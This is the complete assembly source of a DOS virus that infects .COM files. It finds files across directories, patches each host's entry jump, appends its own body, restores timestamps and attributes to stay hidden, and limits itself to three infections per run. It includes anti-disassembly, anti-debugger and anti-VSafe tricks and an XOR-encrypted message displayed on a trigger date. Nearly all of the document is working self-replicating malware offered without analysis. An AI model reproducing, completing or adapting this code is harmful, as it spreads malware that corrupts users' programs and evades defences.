start_1:
db 24h,21h,0e9h,0,0     ;first byte = jmp far, second byte = how much bytes to jump
ende_start_1:

                ;later here comes the host_program

start_2:        ;here starts the virus

CALL delta              ;get delta offset
delta:                  ;
pop bp                  ;
sub bp,offset delta     ;

                               ;anti_disassembler
mov cx,09ebh
mov ax,0fe05h
jmp $-2
add ah,03bh
jmp $-10

                                ;anti_debugger
mov ax,3503h                    ;save int 3h in bx
int 21h                         ;do it
mov ah,25h                      ;set new int 3h...
mov dx,offset new_int_3         ;...to new_int_3
int 21h                         ;do it
xchg bx,dx                      ;exchange bx,dx (restore original int 3h)
int 21h                         ;do it


                                ;anti_vsafe
mov ax,0f9f2h
add ax,10h
mov dx,5935h
add dx,10h
mov bl,10h
sub bl,10h
int 16h




mov byte ptr[bp+drive],0
call get_cur_drive
cmp al,0
jne go_on_5
mov byte ptr[bp+drive],1
mov dl,2h 
call set_cur_drive

go_on_5:

mov dl,00h
lea si,[bp+offset cur_dir]
call get_cur_dir

mov di,100h                     ;restore original 3 bytes of the host_prog. to 100h
lea si,[bp+original_three]      ;from where (original_three)
mov cx,5                        ;3 bytes
rep movsb                       ;copy 'em to 100h

lea dx,[bp+offset new_dta]      ;offset of new DTA
call set_new_dta                ;set new DTA

find_first_again:
lea dx,[bp+offset file]         ;file_spec (*.COM)
mov cx,0007h                    ;all attributes
CALL find_first                 ;find_first
jc no_more_filez_in_dir

jmp go_on                       ;jump to go_on

find_next_2:                    ;find_next file

CALL find_next                  ;and find_next
jnc go_on                      ;no more filez -> restore

no_more_filez_in_dir:
lea dx,[bp+offset dot_dot]
call chdir
cmp al,3
jne go_on_4
call restore
go_on_4:
call find_first_again

go_on:                          ;go to here after the first_file is found

lea si,[bp+offset new_dta+15h]  ;save(get) DTA information (begin with the attribs)
mov cx,9                        ;9 bytes to copy
lea di,[bp+offset f_attr]       ;file_attribs -> file_time -> file_date -> file_size
rep movsb                       ;save em (copy em)

xor cx,cx
lea dx,[bp+offset new_dta+1eh]
call set_file_attributes

cmp dword ptr[bp+file_size],200
jnb size_ok_1

xor ch,ch
mov cl,byte ptr[bp+f_attr]
lea dx,[bp+offset new_dta+1eh]
call set_file_attributes
jmp find_next_2

size_ok_1:
cmp dword ptr[bp+file_size],60000
jna size_ok_2

xor ch,ch
mov cl,byte ptr[bp+f_attr]
lea dx,[bp+offset new_dta+1eh]
call set_file_attributes

jmp find_next_2

size_ok_2:
mov al,02h                      ;open file for read & write
lea dx,[bp+offset new_dta+1eh]  ;file_name in DTA
CALL open                       ;open it

mov bx,ax                       ;move file_handler in bx

CALL infect                     ;now infect it!!!

nop                             ;without this nop the infected prog will crash. i don't know why?!?

mov dx,word ptr[bp+f_date]
mov cx,word ptr[bp+f_time]
call set_file_time_date

call close

xor ch,ch
mov cl,byte ptr[bp+f_attr]
lea dx,[bp+offset new_dta+1eh]
call set_file_attributes

add word ptr[bp+counter],1
cmp word ptr[bp+counter],3
je restore


call find_next_2

restore:                        ;restore old DTA and run normal program
 
call restore_old_dta            ;restore DTA

dir_loop:
lea dx,[bp+offset dot_dot]
call chdir
cmp al,3h
jne dir_loop

lea dx,[bp+offset cur_dir]
call chdir

cmp byte ptr[bp+drive],1
jne go_on_6
mov dl,00h
call set_cur_drive

go_on_6:
call get_system_date

cmp dh,4
jne not_the_right_day
cmp al,0
jne not_the_right_day

lea si,[bp+offset message]
mov cx,offset message_ende-offset message
call crypt

lea dx,[bp+offset message]
call write_string

call wait_for_key

not_the_right_day:

mov di,100h                     ;jump to 100h. the original three bytes have already been restored.
jmp di                          ;jump too 100h

;these are the rutines that can be 'called'
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;INFECTION RUTINE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

infect:                         ;to infect the file :-)
lea dx,[bp+original_three]      ;save the first 3 bytes in original_three
mov cx,5                        ;3 bytes
CALL read                       ;read em

call already_infected           ;already infected ???
jne go_on_2

go_on_3:

call close

xor ch,ch
mov cl,byte ptr[bp+f_attr]
lea dx,[bp+offset new_dta+1eh]
call set_file_attributes

call find_next_2                  ;yes, find_next file

go_on_2:

cmp word ptr[bp+original_three],'MZ'
je go_on_3
cmp word ptr[bp+original_three],'ZM'
je go_on_3

CALL seek_to_begin              ;seek to beginning of the file

CALL calculate_new_jump         ;calculate the new jump(first 3 bytes)

mov cx,5                        ;write 3 bytes
lea dx,[bp+new_jump]            ;from new calculated jump
CALL write                      ;write

CALL seek_to_end                ;go to end of file

mov ax,word ptr[bp+counter]
push ax
mov word ptr[bp+counter],0000h
mov cx,ende_start_2-start_2     ;write virussize -3 bytes
lea dx,[bp+start_2]             ;from label start_2
CALL write                      ;write
pop ax
mov word ptr[bp+counter],ax

ret                             ;and return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;READ RUTINE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

read:                           ;read bytes from file
mov ah,3fh                      ;function read
int 21h                         ;read
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;SEEK_TO_END;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

seek_to_end:                    ;seek to end of file
mov ax,4202h                    ;function seek to end
xor cx,cx
xor dx,dx
int 21h                         ;seek
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;SEEK_TO_BEGIN;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

seek_to_begin:                  ;seek to begin of file
mov ax,4200h                    ;function seek to begin
xor cx,cx
xor dx,dx
int 21h                         ;seek
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;CALCULATE_NEW_JUMP;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

calculate_new_jump:             ;calculates the new jump
mov byte ptr[bp+new_jump],24h
mov byte ptr[bp+new_jump+1],21h
mov byte ptr[bp+new_jump+2],0e9h  ;= jmp far
mov ax,word ptr[bp+file_size]   ;2nd + 3rd byte = file_size...
sub ax,5                        ;...-3
mov word ptr[bp+new_jump+3],ax  ;put these 3 bytes in new_jump
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;WRITE RUTINE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

write:                          ;write bytes to file
mov ah,40h                      ;function write
int 21h                         ;write
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;CLOSE;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

close:                          ;close a file
mov ah,3eh                      ;function close
int 21h                         ;close
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OPEN;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

open:                           ;open a file
mov ah,3dh                      ;function open
int 21h                         ;open
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;set_file_time_date;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

set_file_time_date:             ;sets the files date & time
mov ax,5701h                    ;function set date & time
int 21h                         ;set date & time
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;find_first;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

find_first:                     ;find first file
mov ah,4eh                      ;function find_first
int 21h                         ;find_first
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;find_next;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

find_next:                      ;find_next file
mov ah,4fh                      ;function find_next
int 21h                         ;find_next
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;SET_NEW_DTA;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

set_new_dta:                    ;sets the data transfer address (DTA)
mov ah,1ah                      ;function set DTA
int 21h                         ;set DTA
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;restore_old_dta;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

restore_old_dta:                ;restores the old DTA
mov ah,1ah                      ;function set DTA
mov dx,80h                      ;where old DTA was located
int 21h                         ;set DTA
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;set_file_attributes;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

set_file_attributes:            ;sets the file attributes
mov ax,4301h                    ;function set file attributes
int 21h                         ;set file attribs
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;already_infected;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

already_infected:               ;checks if the file is already infected
mov ax,dword ptr[bp+file_size]  ;mov ax,file_size
sub ax,(ende_start_2-start_2)+5 ;sub ax,virus_size
cmp word ptr[bp+offset original_three+3],ax     ;if the first bytes are the same its already infected
ret                             ;return

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;crypt;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
crypt:
mov di,si
xor_loop:
lodsb
xor al,byte ptr[bp+crypt_val]
stosb
loop xor_loop
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;chdir;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
chdir:
mov ah,3bh
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;get_cur_drive;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_cur_drive:
mov ah,19h
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;set_cur_drive;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
set_cur_drive:
mov ah,0eh
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;get_cur_dir;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_cur_dir:
mov ah,47h
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;get_system_date;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_system_date:
mov ah,2ah
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;write_string;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
write_string:
mov ah,9h
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;wait_for_key;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
wait_for_key:
mov ah,00h
int 21h
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



new_dta db 43 dup(?)            ;new DTA (43 BYTES)
f_attr db ?                     ;file attributes
f_time dw ?                     ;file time
f_date dw ?                     ;file date
file_size dd ?                  ;file size
file db'*.COM',0                ;all com filez
original_three db 0cdh,20h,0,1,2    ;first three bytes of infected prog
new_jump db 5 dup(?)            ;to calculate the new jump (3 bytes)
counter dw ?
crypt_val db 123
message:
db 40, 14, 21, 41, 18, 8, 30, 91, 12, 9, 18, 15, 15, 30, 21, 91, 25, 2, 91, 40, 11, 20, 20, 16, 2, 85, 91, 58, 14, 8, 15, 9, 18, 26, 91, 74, 66, 66, 77, 85, 113, 118, 95
message_ende:
dot_dot db '..',0
cur_dir db 64 dup(?)
drive db ?
new_int_3:
jmp $

ende_start_2:                   ;END VIRUS
